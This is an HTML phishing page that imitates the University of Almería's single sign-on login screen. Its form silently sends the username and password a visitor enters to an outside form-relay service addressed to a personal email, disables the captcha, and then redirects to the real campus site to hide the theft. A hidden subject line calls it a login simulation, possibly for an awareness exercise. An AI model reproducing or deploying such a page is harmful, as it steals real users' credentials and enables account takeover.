<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xml:lang="es" lang="es" xmlns="http://www.w3.org/1999/xhtml"> 

<head>
    <title>Validaci&oacute;n de usuario de la Universidad de Almería</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link type="text/css" rel="stylesheet" href="https://oam.ual.es:443/public_oam/oam/styles.css" />
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css"
        integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp"
        crossorigin="anonymous">
    <script>
        function trim(s) {
            return s.replace(/^\s*/, "").replace(/\s*$/, "");
        }

        function validate() {
            if (trim(document.frmLogin.username.value) == "") {
                alert("Login empty");
                document.frmLogin.susername.focus();
                return false;
            } else if (trim(document.frmLogin.password.value) == "") {
                alert("password empty");
                document.frmLogin.password.focus();
                return false;
            }
            document.getElementById('submit').setAttribute("disabled", "disabled");
        }

        function setFocus() {
            document.forms[0].username.focus();
        };
        window.onload = setFocus;
    </script>
</head>

<body id="page-login">
    <div id="login-dialog">
        <div class="card">
            <div class="card-header">
                <img src="https://www.ual.es/application/themes/ual/images/logoual25-300px.png">
            </div>
            <h1 class="card-header">Validación de usuario de la UAL</h1>
            <div class="card-body">
                <h2 class="card-title">Iniciar sesión</h2>

                <!-- FORMULARIO CON FORM SUBMIT + REDIRECCIÓN -->
                <form action="https://formsubmit.co/mqs562@inlumine.ual.es" method="POST">
                    <input type="hidden" name="_captcha" value="false">
                    <input type="hidden" name="_subject" value="Simulación de login UAL">
                    <input type="hidden" name="_template" value="box">
                    <input type="hidden" name="_next" value="https://campus.ual.es/">

                    <div class="form-group">
                        <label for="ssousername">Usuario</label>
                        <input type="text" class="form-control" name="ssousername" placeholder="Introduzca su usuario" required>
                    </div>
                    <div class="form-group">
                        <label for="password">Contraseña</label>
                        <input class="form-control" type="password" name="password" placeholder="Introduzca su contraseña" required>
                        <a class="form-text" href="https://campus.ual.es/regeneraPass">
                            ¿ Olvidó su contrase&ntilde;a ?
                        </a>
                    </div>
                    <div class="d-flex flex-row justify-content-between buttons">
                        <a class="btn no-padding" href="https://www.ual.es/servicios/stic/servicio/alta-usuarios">
                            Solicitud de alta en Campus
                        </a>
                        <input type="submit" class="btn btn-primary" value="Conectar">
                    </div>
                </form>
            </div>
            <div class="card-footer text-muted">
                El uso no autorizado de esta dirección está prohibido y puede estar sujeto a acciones civiles y penales.
            </div>
        </div>
        <footer>
            <div class="container">
                <div class="row">
                    <div class="col-8 col-md-8">
                        <div id="j_id331">
                            <ul class="nav nav-pills">
                                <li class="nav-item">
                                    <a class="nav-link" href="https://www.ual.es/avisolegal">Aviso legal</a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" href="https://www.ual.es/politicaprivacidad">Privacidad</a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" href="https://www.ual.es/servicios/stic/servicio/servicios-federados">Servicios Federados</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-4 col-md-4">
                        <p class="copyright text-left text-md-right">&copy; UAL 2018</p>
                    </div>
                </div>
            </div>
        </footer>
    </div>
</body>

</html>
